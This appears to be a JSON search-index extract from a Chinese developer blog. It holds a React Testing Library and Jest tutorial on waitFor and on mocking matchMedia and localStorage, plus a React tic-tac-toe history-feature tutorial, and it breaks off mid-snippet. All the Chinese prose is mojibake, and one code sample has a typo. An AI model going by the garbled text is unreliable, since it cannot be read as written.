= useState&lt;boolean&gt;(false) useEffect(() =&gt; { // 0.5s å¾Œè‡ªå‹•ç™»å…¥ setTimeout(() =&gt; { setIsLogin(true) }, 500) }, []) // é¡¯ç¤ºç™»å‡ºæˆ–ç™»å…¥æŒ‰éˆ• return ( &lt;div&gt; {isLogin ? ( &lt;button className='btn-logout'&gt;Logout&lt;/button&gt; ) : ( &lt;button className='btn-login'&gt;Login&lt;/button&gt; )} &lt;/div&gt; )} æ‡‰è©²ä¸éœ€è¦ç‰¹åˆ¥èªªæ˜é€™æ˜¯åœ¨å¹¹å˜›çš„ç¯„ä¾‹ï¼Œç¸½ä¹‹é€™é‚Šæƒ³æ¸¬è©¦çš„æ˜¯ä½¿ç”¨è€…ç™»å…¥æ™‚æ˜¯å¦èƒ½çœ‹åˆ° login æŒ‰éˆ•ã€‚ ä»¥é€™å€‹ä¾‹å­ä¾†èªªä½ ç•¶ç„¶å¯ä»¥ç”¨ findByRole ä¾†è™•ç†ï¼Œä½†å‡è¨­ä½ çœŸçš„èµ°æŠ•ç„¡è·¯åªå‰©ä¸‹ querySelector ä¹‹é¡çš„é¸æ“‡æ™‚ï¼Œä½ å¯ä»¥ç”¨ waitFor ä¾†è™•ç†ï¼š 123456789import { render, waitFor } from '@testing-library/react'import { QueryByClass } from './QueryByClass'describe('QueryByClass', () =&gt; { test('if login, should see the logout button', async () =&gt; { render(&lt;QueryByClass /&gt;) await waitFor(() =&gt; expect(document.querySelector('.btn-logout')).toBeInTheDocument()) })}) waitFor çš„åŸç†æ˜¯ä»–æœƒä¸åœçš„å»åŸ·è¡Œ callback ä¸­çš„ assertionï¼Œç›´åˆ° assertion é€šéç‚ºæ­¢ã€‚é è¨­çš„ç­‰å¾…æ™‚é–“æ˜¯ 1 ç§’ï¼Œæœ‰éœ€è¦çš„è©±å¯ä»¥å‚³å…¥ options ä¾†èª¿æ•´ã€‚æ›´å¤šè©³ç´°è³‡è¨Šè«‹åƒè€ƒ å®˜æ–¹æ–‡ä»¶ æ‰€ä»¥é€™é‚Šçš„æµç¨‹å°±æ˜¯æœƒä¸åœçš„ç”¨ querySelector æª¢æŒ‰éˆ•æ˜¯å¦åœ¨ DOM è£¡é¢ï¼Œå¦‚æœä¸€ç§’å…§æœ‰æ‰¾åˆ°å°±æœƒ PASSï¼Œåä¹‹å‰‡ FAILã€‚ Uncaught TypeError: window.matchMedia is not a functionæˆ‘å·¥ä½œå°ˆæ¡ˆçš„ä¸­æœ‰ç”¨åˆ° Ant Designï¼Œåœ¨è·‘æ¸¬è©¦çš„æ™‚å€™å°±å™´äº†é€™å€‹ Errorï¼š é€™æ˜¯å› ç‚ºåœ¨ jest çš„ç’°å¢ƒï¼ˆnode.jsï¼‰ä¸¦æ²’æœ‰ window.matchMedia é€™ç¨®æ±è¥¿ï¼Œè€Œæˆ‘å€‘å»åœ¨ component ä¸­ç”¨åˆ°äº†ï¼Œæ‰€ä»¥æ‰æœƒå™´å‡ºé€™å€‹éŒ¯èª¤ã€‚ è§£æ±ºçš„æ–¹æ³•å°±æ˜¯è‡ªå·±å®šç¾©ä¸€å€‹ mock functionï¼Œå¯ä»¥åŠ ä¸Šé€™æ®µï¼š 1234567891011// setupTests.ts// ...ç•¥global.matchMedia = global.matchMedia || function () { return { addListener: jest.fn(), removeListener: jest.fn() } } æˆ‘é€™é‚Šæ˜¯å› ç‚ºå¾ˆå¤šåœ°æ–¹éƒ½æœ‰ç”¨åˆ° Ant Design å…ƒä»¶æ‰€ä»¥æ‰åŠ åœ¨ setupTests.ts ä¾†åš global è™•ç†ï¼Œå¦‚æœä½ åªæƒ³é‡å°å–®ç­†æ¸¬è©¦æ·»åŠ çš„è©±ä¹Ÿæ˜¯ ok çš„ï¼š 1234567891011121314151617181920// xxx.test.tsxwindow.matchMedia = window.matchMedia || function () { return { addListener: jest.fn(), removeListener: jest.fn() } }// è·Ÿä¸Šé¢æ˜¯ä¸€æ¨£çš„æ±è¥¿Object.defineProperty(window, 'matchMedia', { writable: true, value: (query: any) =&gt; { return { addListener: jest.fn(), removeListener: jest.fn() } }}) é™„è¨»ï¼šå¦‚æœè¦ç”¨ function çš„æ–¹å¼ä¾†å›å‚³ objectï¼Œä¸è¦æŠŠé€™å€‹ function è®Šæˆ jest.fn ç³»åˆ—çš„ mock functionã€‚é›–ç„¶å®˜æ–¹ç¯„ä¾‹æ˜¯é€™æ¨£å­åšï¼Œä½†æˆ‘è‡ªå·±å¯¦éš›å»è·‘æœƒå‡ºå•é¡Œã€‚ è©³ç´°è³‡è¨Šå¯ä»¥åƒè€ƒ å®˜æ–¹æ–‡ä»¶ æˆ–é€™ç¯‡ è¨è«–ã€‚ æ€éº¼æ¨¡æ“¬ localStorageï¼Ÿå…¶å¯¦å°±è·Ÿå‰ä¸€å€‹å•é¡Œçš„æ¦‚å¿µæ˜¯ä¸€æ¨£çš„ï¼Œæ—¢ç„¶ jest ç’°å¢ƒè£¡æ²’æœ‰ window.localStorage é€™ç¨®æ±è¥¿ï¼Œé‚£å°±åªå¥½è‡ªå·±å¹«ä»–å®šç¾©ä¸€å€‹ã€‚ é€™é‚Šå…ˆä¾†çœ‹å€‹ç¯„ä¾‹ï¼š 123456789101112export const Storage = () =&gt; { function onClick() { localStorage.setItem('username', 'PeaNu') } return ( &lt;div&gt; &lt;h2&gt;User: {localStorage.getItem('username') ?? ''}&lt;/h2&gt; &lt;button onClick={onClick}&gt;Save&lt;/button&gt; &lt;/div&gt; )} å‡è¨­æˆ‘ç¾åœ¨æƒ³ mock localStorage.getItem çš„å›å‚³å€¼çš„è©±å¯ä»¥é€™æ¨£åšï¼š 123456789101112131415161718192021222324import { render, screen } from '@testing-library/react'import { Storage } from './Storage'// å®šç¾© mockconst mockLocalStorage = { getItem: jest.fn()}// ç¶åˆ° window èº«ä¸ŠObject.defineProperty(window, 'localStorage', { value: mockLocalStorage })describe('Storage', () =&gt; { test('mock getItem value', async () =&gt; { const mockValue = 'PPB' // è¨­å®š mock function çš„ implementation mockLocalStorage.getItem.mockImplementation((key: string) =&gt; mockValue) // æ¸²æŸ“å…ƒä»¶ render(&lt;Storage /&gt;) // Assertion expect(mockLocalStorage.getItem).toBeCalledWith('username') const name = screen.getByRole('heading', { level: 2 }) expect(name).toHaveTextContent(mockValue) })}) çœ‹ code æ‡‰è©²å°±èƒ½ç†è§£åœ¨åšä»€éº¼äº†ã€‚å¦å¤–é€™é‚Šæœ‰å¹¾å€‹å¯èƒ½æœƒçŠ¯çš„éŒ¯ï¼Œä¾†æé†’ä¸€ä¸‹ï¼š 1. mock function çš„å›å‚³å€¼ä¸€å®šè¦åœ¨å–®ä¸€å€‹ test ä¸­è¨­å®šï¼Œä¸å¯ä»¥è¨­å®šåœ¨å¤–å±¤ï¼š 1234567891011121314151617181920212223import { render, screen } from '@testing-library/react'import { Storage } from './Storage'const mockLocalStorage = { // ä¹Ÿä¸å¯ä»¥åœ¨é€™é‚Šå¯«æˆ jest.fn.mockImplementation(...)ï¼Œæ²’æœ‰ç”¨ getItem: jest.fn()}Object.defineProperty(window, 'localStorage', { value: mockLocalStorage })// ä¸å¯ä»¥åœ¨é€™é‚Šè¨­å®šï¼Œå¦å‰‡æ°¸é æœƒæ‹¿åˆ° undefinedconst mockValue = 'PPB'mockLocalStorage.getItem.mockImplementation((key: string) =&gt; mockValue)describe('Storage', () =&gt; { test('mock getItem value', async () =&gt; { render(&lt;Storage /&gt;) expect(mockLocalStorage.getItem).toBeCalledWith('username') const name = screen.getByRole('heading', { level: 2 }) // é€™æ®µæœƒå‡ºéŒ¯ expect(name).toHaveTextContent(mockValue) })}) 2. é †åºä¸€å®šè¦å°ï¼Œä¸ç„¶ä¸€æ¨£æ‹¿ä¸åˆ°å›å‚³å€¼ï¼š 123456789101112131415161718192021import { render, screen } from '@testing-library/react'import { Storage } from './Storage'const mockLocalStorage = { getItem: jest.fn()}Object.defineProperty(window, 'localStorage', { value: mockLocalStorage })describe('Storage', () =&gt; { test('mock getItem value', async () =&gt; { const mockValue = 'PPB' // æ¸²æŸ“å…ƒä»¶ render(&lt;Storage /&gt;) // ä¸å¯ä»¥åœ¨å…ƒä»¶æ¸²æŸ“å¾Œæ‰è¨­å®šå›å‚³å€¼ï¼Œé€™æ¨£å°±ä¾†ä¸åŠäº†ã€‚ mockLocalStorage.getItem.mockImplementation((key: string) =&gt; mockValue) expect(mockLocalStorage.getItem).toBeCalledWith('username') const name = screen.getByRole('heading', { level: 2 }) expect(name).toHaveTextContent(mockValue) })}) å¦‚æœä¸Šé¢çš„ç¯„ä¾‹æœ‰ç†è§£ï¼Œé‚£ setItem æ‡‰è©²ä¹Ÿæ²’ä»€éº¼å›°é›£çš„äº†ã€‚å¯ä»¥å…ˆè‡ªå·±è©¦è©¦çœ‹å†å›ä¾†å° codeï¼Œçœ‹æœ‰æ²’æœ‰è·Ÿä½ æƒ³çš„ä¸€æ¨£ï¼š 1234567test('if button click should setItem to storage', () =&gt; { render(&lt;Storage /&gt;) const button = screen.getByRole('button', { name: /save/i }) userEvent.click(button) expect(mockLocalStorage.setItem).toHaveBeenCalled() expect(mockLocalStorage.setItem).toHaveBeenCalledWith('username', 'PeaNu')}) åƒè€ƒè³‡æ–™ React Testing Tutorial React Testing Library å®˜æ–¹æ–‡ä»¶ Jest å®˜æ–¹æ–‡ä»¶ React Testing by pjchender","link":"/2022/12/09/react-testing/"},{"title":"React ä¹‹åœ¨æˆ°åœˆåœˆå‰å‰ï¼Œä¾†åŠ ä¸Šæ™‚å…‰æ©Ÿçš„åŠŸèƒ½å§ï¼","text":"ç‚ºäº†é‡æ¸…æ€è·¯ï¼Œè²»äº†ä¸€ç•ªåŠŸå¤«å‘€ã€‚ ç°¡è¿°ç¹¼ä¸Šä¸€ç¯‡ æƒ³ç”¨ React åšå‡ºäº”å­æ£‹å—ï¼Ÿå…ˆå¾åœˆåœˆå‰å‰é–‹å§‹å§ ä»¥å¾Œï¼Œæˆ‘å€‘æˆåŠŸåšå‡ºåŸºæœ¬çš„åœˆåœˆå‰å‰äº†ã€‚ é€™ä¸€æ¬¡æˆ‘å€‘ä¾†è©¦è‘—å¹«å®ƒåŠ ä¸Šæ›´å²å®³çš„åŠŸèƒ½å§ï¼Œå°±æ˜¯æ¨™é¡Œæåˆ°çš„æ™‚å…‰æ©Ÿï½ é€™å€‹åŠŸèƒ½é›–ç„¶çœ‹èµ·ä¾†è »ç°¡å–®çš„ï¼Œä½†èƒŒå¾Œé‚„è »å¤šç´°ç¯€è¦è€ƒæ…®çš„ï¼Œæ‰€ä»¥é€™ç¯‡çš„é›£åº¦ç›¸å°ä¾†èªªæœƒæ¯”åŸæœ¬çš„æ›´é›£ä¸€äº›ï¼Œä¸éé‚„æ˜¯å…ˆç¥ä½ ä¸€åˆ‡é †åˆ©ï¼ŒåŠ æ²¹å§ï¼ æ€è€ƒæ–°çš„è³‡æ–™çµæ§‹ç‚ºäº†æŠŠæ¯ä¸€æ¬¡çš„æ£‹ç›¤ç‹€æ…‹éƒ½ä¿ç•™ä¸‹ä¾†ï¼Œæ‰€ä»¥å¾—å…ˆæ”¹è®Šä¸€é–‹å§‹çš„è³‡æ–™çµæ§‹ï¼ŒåŸæœ¬æ˜¯é•·é€™æ¨£ï¼š 12345const squares = [ null, null, null, null, null, null, null, null, null,] è¦æ”¹æˆé€™æ¨£ï¼š 12345678910111213141516171819history = [ // ç¬¬ä¸€æ¬¡ { squares: [ null, null, null, null, null, null, null, null, null, ] }, // ç¬¬äºŒæ¬¡ { squares: [ null, null, null, null, 'X', null, null, null, null, ] }, // ...] ä¸€å€‹ã€Œé™£åˆ—åŒ…ç‰©ä»¶ã€ï¼Œã€Œç‰©ä»¶è£¡é¢åˆåŒ…é™£åˆ—ã€çš„çµæ§‹ã€‚ æŠŠç‹€æ…‹è½‰ç§»åˆ°æ›´ä¸Šå±¤ä¸éåœ¨é‚£ä¹‹å‰ï¼Œå…ˆè®“æˆ‘å€‘æŠŠ &lt;Board /&gt; çš„ state è½‰ç§»åˆ°æœ€ä¸Šå±¤çš„ &lt;Game /&gt;ï¼Œè®“å®ƒä¾†ç®¡ç†æ•´å€‹éŠæˆ²çš„ stateï¼Œä¿®æ”¹å®Œä»¥å¾Œæ‡‰è©²è¦é€™æ¨£ï¼š &lt;Board /&gt; çš„éƒ¨åˆ†ï¼š 12345678910111213141516171819202122232425262728293031// æ¥æ”¶å‚³é€²ä¾†çš„ squares è·Ÿ handleUpdateSquaresfunction Board({ squares, handleUpdateSquares }) { const renderSquare = (i) =&gt; { return ( &lt;Square value={squares[i]} handleUpdateSquares={() =&gt; handleUpdateSquares(i)} /&gt; ); }; return ( &lt;div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(0)} {renderSquare(1)} {renderSquare(2)} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(3)} {renderSquare(4)} {renderSquare(5)} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(6)} {renderSquare(7)} {renderSquare(8)} &lt;/div&gt; &lt;/div&gt; );} &lt;Game /&gt; çš„éƒ¨åˆ†ï¼š 123456789101112131415161718192021222324252627282930313233343536373839export default function Game() { // ç§»ä¾†ä¸Šå±¤çš„ state è·Ÿå…¶ä»–æ±è¥¿ const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); let status; const winner = calculateWinner(squares); if (!winner &amp;&amp; !squares.includes(null)) { status = \"draw!\"; } else if (winner) { status = `Winner is ${winner}`; } else { status = `Next player is ${xIsNext ? \"X\" : \"O\"}`; } const handleUpdateSquares = (i) =&gt; { // å·²ç¶“æœ‰è´å®¶ or å·²ç¶“é»é if (calculateWinner(squares) || squares[i]) return; // æ›´æ–° state const copySquares = squares.slice(); copySquares[i] = xIsNext ? \"X\" : \"O\"; setSquares(copySquares); setXIsNext(!xIsNext); }; return ( &lt;div className=\"game\"&gt; &lt;div className=\"game-board\"&gt; // å‚³é€²å»çµ¦ &lt;Borad /&gt; &lt;Board squares={squares} handleUpdateSquares={handleUpdateSquares} /&gt; &lt;/div&gt; &lt;div className=\"game-info\"&gt; // staus ä¹Ÿç§»åˆ°æœ€ä¸Šå±¤ &lt;div&gt;{status}&lt;/div&gt; &lt;ol&gt;{/* TODO */}&lt;/ol&gt; &lt;/div&gt; &lt;/div&gt; );} åšåˆ°é€™é‚Šä»¥å¾Œï¼ŒéŠæˆ²è¦ä¸€æ¨£èƒ½æ­£å¸¸é‹è¡Œï¼Œä¸æœƒå£æ‰ï¼Œå£æ‰çš„è©±ä»£è¡¨ä½ æœ‰åœ°æ–¹åšéŒ¯äº†ï¼Œå†å¤šæª¢æŸ¥å¹¾æ¬¡å§ï¼ æ›´æ–°è³‡æ–™çµæ§‹æ¥è‘—å°±å¯ä»¥æ ¹æ“šæœ€é–‹å§‹è¨­è¨ˆçš„è³‡æ–™çµæ§‹ä¾†åšèª¿æ•´äº†ï¼Œé¦–å…ˆä¾†èª¿æ•´ &lt;Game /&gt; çš„éƒ¨åˆ†ã€‚ é€™é‚Šè¦åšçš„äº‹æƒ…å…¶å¯¦è·Ÿç¬¬ä¸€å€‹ç‰ˆæœ¬æ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ï¼Œåªæ˜¯å› ç‚ºè³‡æ–™çµæ§‹è®Šè¤‡é›œäº†ï¼Œæ‰€ä»¥å¯èƒ½è¦å¤šæƒ³ä¸€ä¸‹æ‰çœ‹å¾—æ‡‚åœ¨å¹¹å˜›ï¼Œå»ºè­°å°±å¤šçœ‹è¨»è§£å¤šæƒ³å¹¾éå§ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152export default function Game() { /* 1. æ”¹è®Šè³‡æ–™çµæ§‹ */ const [history, setHistory] = useState([{ squares: Array(9).fill(null) }]); const [xIsNext, setXIsNext] = useState(true); /* 2. æ¯æ¬¡ re-render æ™‚è¦åˆ¤æ–·è¼¸è´çš„éƒ¨åˆ† */ let status; // æ‹¿åˆ°æœ€å¾Œä¸€ç­†æ£‹ç›¤ç‹€æ…‹çš„ object const latest = history[history.length - 1]; // æ ¹æ“šæ£‹ç›¤çš„ç‹€æ…‹è¨ˆç®—è¼¸è´ const winner = calculateWinner(latest.squares); // æ ¹æ“šç‹€æ…‹é¡¯ç¤ºä¸åŒè¨Šæ¯ if (!winner &amp;&amp; !latest.squares.includes(null)) { status = \"draw!\"; } else if (winner) { status = `Winner is ${winner}`; } else { status = `Next player is ${xIsNext ? \"X\" : \"O\"}`; } /* 3. event handler çš„éƒ¨åˆ† */ const handleUpdateSquares = (i) =&gt; { // æ‹¿åˆ°æœ€å¾Œä¸€ç­†æ£‹ç›¤ç‹€æ…‹çš„ object const latest = history[history.length - 1]; // å·²ç¶“æœ‰è´å®¶ or å·²ç¶“é»é if (calculateWinner(latest.squares) || latest.squares[i]) return; // è¤‡è£½åŸæœ¬çš„æ£‹ç›¤ç‹€æ…‹ const newSquares = latest.squares.slice(); // æŠŠæ”¹è®Šçš„åœ°æ–¹æ›´æ–°å€¼ newSquares[i] = xIsNext ? \"X\" : \"O\"; // æ›´æ–° state setHistory([...history, { squares: newSquares }]); setXIsNext(!xIsNext); }; return ( &lt;div className=\"game\"&gt; &lt;div className=\"game-board\"&gt; &lt;Board // æŠŠæœ€æ–°çš„æ£‹ç›¤ç‹€æ…‹å‚³é€²å» squares={latest.squares} // event handler handleUpdateSquares={handleUpdateSquares} /&gt; &lt;/div&gt; &lt;div className=\"game-info\"&gt; &lt;div&gt;{status}&lt;/div&gt; &lt;ol&gt;{/* TODO */}&lt;/ol&gt; &lt;/div&gt; &lt;/div&gt; );} åšåˆ°é€™é‚Šä»¥å¾Œï¼ŒéŠæˆ²ä¸€æ¨£èƒ½æ­£å¸¸é‹ä½œï¼ŒåŒæ™‚ä¹ŸæŠŠæ¯ä¸€æ­¥çš„ç´€éŒ„ç•™ä¸‹äº†ï¼š é¡¯ç¤ºæ­·å²ç´€éŒ„æ—¢ç„¶å·²ç¶“æœ‰å°æ‡‰çš„ stateï¼Œå°±å¯ä»¥åˆ©ç”¨å®ƒä¾†æŠŠæ­·å²ç´€éŒ„é¡¯ç¤ºåˆ°ç•«é¢ä¸Šã€‚ å…ˆå»ºç«‹ä¸€å€‹ç”¨ä¾†é¡¯ç¤ºæŒ‰éˆ•çš„ Componentï¼š 123456789function ListItem({ step }) { // è¨˜å¾—è¦å°é‚„æ²’ä¸‹åŠæ­¥æ£‹ä¹‹å‰çš„è¨Šæ¯åšèª¿æ•´ const content = step === 0 ? `Go to start` : `Go to ${step}`; return ( &lt;li&gt; &lt;button&gt;{content}&lt;/button&gt; &lt;/li&gt; );} é€™é‚Šæœƒæ¥æ”¶ä¸€å€‹ stepï¼Œè¡¨ç¤ºé€™æ˜¯å›åˆ°ç¬¬ N å€‹æ­¥é©Ÿçš„æŒ‰éˆ•ï¼Œè‡³æ–¼ &lt;Game /&gt; çš„éƒ¨åˆ†ä¹Ÿè¦åšå°æ‡‰çš„è™•ç†ï¼š 123456789101112131415161718192021222324export default function Game() { const [history, setHistory] = useState([{ squares: Array(9).fill(null) }]); const [xIsNext, setXIsNext] = useState(true); return ( &lt;div className=\"game\"&gt; &lt;div className=\"game-board\"&gt; &lt;Board squares={latest.squares} handleUpdateSquares={handleUpdateSquares} /&gt; &lt;/div&gt; &lt;div className=\"game-info\"&gt; &lt;div&gt;{status}&lt;/div&gt; // éæ­· history ä¾†æ¸²æŸ“ N å€‹æŒ‰éˆ• &lt;ul&gt; {history.map((item, step) =&gt; ( &lt;ListItem key={step} step={step} /&gt; ))} &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; );} åšåˆ°é€™é‚Šå¾Œï¼Œçµæœæœƒåƒé€™æ¨£ï¼š å¯¦ä½œè·³èºåŠŸèƒ½ç•«é¢ OK ä»¥å¾Œï¼Œå°±å¯ä»¥ä¾†è™•ç†é»ä¸‹æŒ‰éˆ•å¾Œè·³èºçš„åŠŸèƒ½ã€‚ é€™é‚Šæœ‰å…©ç¨®åšæ³•ï¼Œä¸€ç¨®æ˜¯è·³èºå¾Œç›´æ¥æ‹‹æ£„å¾Œé¢çš„ç´€éŒ„ï¼Œä¸€ç¨®æ˜¯è·³èºå¾Œåˆèµ°ä¸‹ä¸€æ­¥æ™‚æ‰æ‹‹æ£„ç´€éŒ„ï¼Œè½ä¸å¤ªæ‡‚çš„è©±åƒè€ƒä¸‹é¢çš„å…©å¼µåœ–ï¼š ç¬¬ä¸€ç¨®æ¯”è¼ƒç°¡å–®ï¼Œç¬¬äºŒç¨®æ˜¯å®˜æ–¹æ•™å­¸çš„ä½œæ³•ã€‚é€™é‚Šæˆ‘è¦ºå¾—å…ˆç†è§£ç¬¬ä¸€ç¨®è¦æ€éº¼åšä»¥å¾Œï¼Œå†ä¾†å­¸ç¬¬äºŒç¨®æœƒæ¯”è¼ƒå¥½æ‡‚ä¸€é»ï¼Œæ‰€ä»¥æœƒå…ˆè¬›ç¬¬ä¸€ç¨®çš„ä½œæ³•ã€‚ ä½œæ³•ä¸€é¦–å…ˆä¾†åšè·³èºçš„å‡½å¼ï¼š 1234const handleJumTo = (step) =&gt; { const newHistory = history.slice(0, step + 1); setHistory(newHistory);}; åªè¦æ ¹æ“šå‚³å…¥çš„ step å»æ›´æ–° history å°±è¡Œäº†ï¼Œä¸éè¦æ³¨æ„ä¸€ä¸‹ slice çš„ç”¨æ³•ã€‚å‡å¦‚æˆ‘è¦å›åˆ°ä¸€é–‹å§‹ï¼ˆstep=0ï¼‰ï¼Œé‚£ slice(0, 0) åªæœƒç•™ä¸‹ç©ºé™£åˆ—ï¼Œæ‰€ä»¥æ‰è¦ step + 1ã€‚ æ¥è‘—æŠŠé€™å€‹å‡½å¼å‚³å…¥ &lt;ListItem /&gt;ï¼š 123456789101112131415161718192021222324252627282930export default function Game() { // ... const handleJumTo = (step) =&gt; { // slice(0 ,1) =&gt; ç•™ä¸‹ä¸€å€‹ // slice(0, 2) =&gt; ç•™ä¸‹å…©å€‹ const newHistory = history.slice(0, step + 1); setHistory(newHistory); }; return ( &lt;div className=\"game\"&gt; &lt;div className=\"game-board\"&gt; &lt;Board squares={latest.squares} handleUpdateSquares={handleUpdateSquares} /&gt; &lt;/div&gt; &lt;div className=\"game-info\"&gt; &lt;div&gt;{status}&lt;/div&gt; &lt;ul&gt; {history.map((item, step) =&gt; ( // å‚³é€²å» &lt;ListItem key={step} step={step} handleJumTo={handleJumTo} /&gt; ))} &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; );} æœ€å¾Œåœ¨ &lt;ListItem /&gt; æ¥æ”¶ï¼š 12345678function ListItem({ step, handleJumTo }) { const content = step === 0 ? `Go to start` : `Go to ${step}`; return ( &lt;li&gt; &lt;button onClick={() =&gt; handleJumTo(step)}&gt;{content}&lt;/button&gt; &lt;/li&gt; );} æ³¨æ„å› ç‚ºè¦å‚³å…¥åƒæ•¸ï¼Œæ‰€ä»¥ onClick çš„ handler å¾—åœ¨åŒ…ä¸€å±¤ functionï¼Œå¦‚æœ arrow function çœ‹ä¸å¤ªæ‡‚çš„è©±ï¼Œå¯«æˆé€™æ¨£æ‡‰è©²æœƒå¥½æ‡‚ä¸€äº›ï¼š 12345678910function ListItem({ step, handleJumTo }) { const content = step === 0 ? `Go to start` : `Go to ${step}`; return ( &lt;li&gt; &lt;button onClick={fuunction () { handleJumTo(step) }}&gt;{content}&lt;/button&gt; &lt;/li&gt; );} é™„è¨»ï¼šå¦‚æœä½ æ˜¯å¯« class component çš„è©±è«‹å‹™å¿…ç”¨ç®­é ­å‡½å¼ï¼Œä¸ç„¶æœƒæœ‰ this å€¼è·‘æ‰çš„å•é¡Œã€‚ åšåˆ°é€™é‚Šï¼Œè·³èºåŠŸèƒ½å°±å®Œæˆäº†ã€‚ ç¢ºå¯¦ OK äº†ï¼Œä¸éæœ‰å€‹åœ°æ–¹æ²’åšå¥½ï¼Œå°±æ˜¯ç›®å‰ player çš„ç‹€æ…‹æ‡‰è©²ä¹Ÿè¦è·Ÿè‘—æ”¹è®Šæ‰å°ï¼Œç¾åœ¨ä¸ç®¡å›åˆ°ç¬¬å¹¾æ­¥éƒ½æ˜¯è¼ªåˆ° Xï¼Œæ‰€ä»¥åœ¨è·³èºæ™‚æ‡‰è©²é †ä¾¿åšå°æ‡‰çš„è™•ç†ï¼š 123456const handleJumTo = (step) =&gt; { const newHistory = history.slice(0, step + 1); setHistory(newHistory); // æ›´æ–° player ç‹€æ…‹ setXIsNext(step % 2 === 0);}; X æœƒå‡ºç¾åœ¨ç¬¬ã€Œå¥‡æ•¸ã€æ­¥ï¼Œæ‰€ä»¥ç•¶ step æ˜¯å¶æ•¸æ™‚è¦æŠŠ XIsNext è¨­ç‚º trueï¼Œåä¹‹ falseã€‚ åšåˆ°é€™é‚Šï¼Œæ•´å€‹è·³èºçš„åŠŸèƒ½å°±å®Œæˆäº†ã€‚ é †é“ä¸€æï¼Œå¦‚æœä½ è¦ºå¾—æœ€å¾Œä¸€å€‹æŒ‰éˆ•æœ‰é»å¤šé¤˜çš„è©±ï¼Œå¯ä»¥åœ¨æ¸²æŸ“ &lt;ListItem /&gt; çš„æ™‚å€™å¤šåšä¸€é“è™•ç†ï¼š 123456&lt;ul&gt; // å…ˆ slice æ‰æœ€å¾Œä¸€ç­†å† map {history.slice(0, -1).map((item, step) =&gt; ( &lt;ListItem key={step} step={step} handleJumTo={handleJumTo} /&gt; ))}&lt;/ul&gt; ç¬¬ä¸€ç¨®åšæ³•å°±åˆ°é€™é‚ŠçµæŸï¼Œé€™é‚Šé™„ä¸ŠåŸå§‹ç¢¼ï¼Œæœ‰èˆˆè¶£å¯ä»¥åƒè€ƒçœ‹çœ‹ã€‚ ä½œæ³•äºŒæ¥ä¸‹ä¾†è¦ä»‹ç´¹ç¬¬äºŒç¨®ä½œæ³•ã€‚ é¦–å…ˆï¼Œç‚ºäº†ä¸åœ¨è·³èºæ™‚ç›´æ¥æ¸…æ‰æ­·å²ç´€éŒ„ï¼Œæˆ‘å€‘å¾—å…ˆæ–°å¢ä¸€å€‹ stateï¼Œç”¨ä¾†è¨˜éŒ„ç›®å‰è™•æ–¼å“ªä¸€æ­¥ï¼š 12345678export default function Game() { const [history, setHistory] = useState([{ squares: Array(9).fill(null) }]); const [xIsNext, setXIsNext] = useState(true); // æ–°å¢ç›®å‰æ­¥æ•¸çš„ state const [stepNumber, setStepNumber] = useState(0); // ...} é€™é‚Šæœƒå¸Œæœ›æ ¹æ“šé€™å€‹ state ä¾†é¡¯ç¤ºç›®å‰çš„æ£‹ç›¤ï¼Œæ‰€ä»¥å¾—ä¿®æ”¹å¹¾å€‹åœ°æ–¹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354export default function Game() { const [history, setHistory] = useState([{ squares: Array(9).fill(null) }]); const [xIsNext, setXIsNext] = useState(true); const [stepNumber, setStepNumber] = useState(0); /* 1. ä¿®æ”¹ latest çš„å€¼ */ // åŸæœ¬æ˜¯ const latest = history[history.length - 1]; const latest = history[stepNumber]; const winner = calculateWinner(latest.squares); let status; if (!winner &amp;&amp; !latest.squares.includes(null)) { status = \"draw!\"; } else if (winner) { status = `Winner is ${winner}`; } else { status = `Next player is ${xIsNext ? \"X\" : \"O\"}`; } const handleJumTo = (step) =&gt; { /* 2. é»ä¸‹è·³èºæŒ‰éˆ•æ™‚æ›´æ–° stepNumber */ setStepNumber(step); setXIsNext(step % 2 === 0); }; const handleUpdateSquares = (i) =&gt; { const latest = history[history.length - 1]; if (calculateWinner(latest.squares) || latest.squares[i]) return; const newSquares = latest.squares.slice(); newSquares[i] = xIsNext ? \"X\" : \"O\"; setHistory([...history, { squares: newSquares }]); setXIsNext(!xIsNext); /* 3. æ›´æ–°ä¸‹æ£‹å¾Œçš„ stepNumber */ setStepNumber(history.length); }; return ( &lt;div className=\"game\"&gt; &lt;div className=\"game-board\"&gt; &lt;Board squares={latest.squares} handleUpdateSquares={handleUpdateSquares} /&gt; &lt;/div&gt; &lt;div className=\"game-info\"&gt; &lt;div&gt;{status}&lt;/div&gt; &lt;ul&gt; {history.map((item, step) =&gt; ( &lt;ListItem key={step} step={step} handleJumTo={handleJumTo} /&gt; ))} &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; );} åšåˆ°é€™é‚Šå¾Œï¼Œæ‡‰è©²å°±æœ‰é€™æ¨£çš„æ•ˆæœï¼š çœ‹èµ·ä¾†å¥½åƒå®Œæˆäº†ï¼Ÿä½†å¾ˆæŠ±æ­‰ï¼Œä¸¦æ²’æœ‰ï¼Œé‚„æœ‰ä¸€å€‹åœ°æ–¹å¾—èª¿æ•´æ‰è¡Œã€‚ å‰›å‰›åªæœ‰ç¤ºç¯„è·³èºçš„æµç¨‹æ˜¯å¦æ­£å¸¸é‹ä½œï¼Œä¸¦æ²’æœ‰æ¥è‘—ç¹¼çºŒä¸‹æ£‹ã€‚å¯æ˜¯å¦‚æœåœ¨è·³èºå®Œä»¥å¾Œåˆç¹¼çºŒä¸‹æ£‹çš„è©±ï¼Œæœƒæ€éº¼æ¨£å‘¢ï¼Ÿ å…ˆæç¤ºä¸€ä¸‹ï¼Œä¸»è¦çš„å•é¡Œå‡ºåœ¨ä¸‹é¢é€™æ®µ codeã€‚é€™é‚Šæˆ‘å¡è »ä¹…çš„ï¼Œå»ºè­°å¤§å®¶å¯ä»¥å…ˆè‡ªå·±æƒ³æƒ³çœ‹å†æ»‘ä¸‹å»çœ‹ç­”æ¡ˆã€‚ 123456789const handleUpdateSquares = (i) =&gt; { const latest = history[history.length - 1]; if (calculateWinner(latest.squares) || latest.squares[i]) return; const newSquares = latest.squares.slice(); newSquares[i] = xIsNext 